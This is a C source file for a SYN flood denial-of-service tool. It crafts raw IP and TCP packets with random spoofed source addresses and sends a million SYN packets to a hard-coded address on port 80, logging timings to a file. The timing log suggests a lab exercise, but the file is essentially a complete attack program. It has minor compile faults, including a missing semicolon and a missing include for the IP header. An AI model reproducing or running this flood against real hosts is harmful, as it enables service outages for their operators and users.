#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define NUM_PACKETS 10000
#define NUM_ITERATIONS 100

void randomIP(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

int randomPort() {
    return rand() % 8000 + 1000;
}

void synFlood(char *victim_ip, int victim_port) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Set the IP_HDRINCL option to tell the kernel that we are providing
    // our own IP header rather than having the kernel create one for us
    int hdrincl = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &hdrincl, sizeof(hdrincl)) < 0) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    // Set the source and destination addresses for the packet
    struct sockaddr_in src_addr, dst_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = inet_addr(victim_ip);
    src_addr.sin_port = htons(victim_port);

    memset(&dst_addr, 0, sizeof(dst_addr));
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_addr.s_addr = inet_addr(victim_ip);
    dst_addr.sin_port = htons(victim_port);

    // Open the file to write the results
    FILE *f = fopen("syns_results_p.txt", "a");
    if (f == NULL) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    int counter = 0;
    time_t start_all = time(NULL);

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        for (int packet = 0; packet < NUM_PACKETS; packet++) {
            time_t start_one = time(NULL);
            char src_ip[16];
            randomIP(src_ip);

            // Set the TCP header fields
            struct tcphdr tcp_hdr
                        memset(&tcp_hdr, 0, sizeof(tcp_hdr));
            tcp_hdr.th_sport = htons(randomPort());
            tcp_hdr.th_dport = htons(victim_port);
            tcp_hdr.th_seq = htonl(rand());
            tcp_hdr.th_ack = 0;
            tcp_hdr.th_off = 5;
            tcp_hdr.th_flags = TH_SYN;
            tcp_hdr.th_win = htons(65535);
            tcp_hdr.th_sum = 0;

            // Set the IP header fields
            struct ip ip_hdr;
            memset(&ip_hdr, 0, sizeof(ip_hdr));
            ip_hdr.ip_v = 4;
            ip_hdr.ip_hl = 5;
            ip_hdr.ip_tos = 0;
            ip_hdr.ip_len = htons(sizeof(ip_hdr) + sizeof(tcp_hdr));
            ip_hdr.ip_id = htons(rand());
            ip_hdr.ip_off = 0;
            ip_hdr.ip_ttl = 255;
            ip_hdr.ip_p = IPPROTO_TCP;
            ip_hdr.ip_sum = 0;
            ip_hdr.ip_src.s_addr = inet_addr(src_ip);
            ip_hdr.ip_dst.s_addr = inet_addr(victim_ip);

            // Create the packet
            char packet[sizeof(ip_hdr) + sizeof(tcp_hdr)];
            memcpy(packet, &ip_hdr, sizeof(ip_hdr));
            memcpy(packet + sizeof(ip_hdr), &tcp_hdr, sizeof(tcp_hdr));

            // Send the packet
            if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dst_addr, sizeof(dst_addr)) < 0) {
                perror("sendto");
                exit(EXIT_FAILURE);
            }

            time_t end_one = time(NULL);
            fprintf(f, "%d->%ld\n", counter, time(NULL) - start_one);
            counter++;
        }
    }

    time_t end_all = time(NULL);
    fprintf(f, "total->%ld\n", end_all - start_all);
    int avg = (end_all - start_all) / NUM_ITERATIONS;
    fprintf(f, "avg->%d", avg);
    fclose(f);
}

int main() {
    char victim_ip[] = "10.100.102.59";
    int victim_port = 80;
    synFlood(victim_ip, victim_port);
    return 0;
}

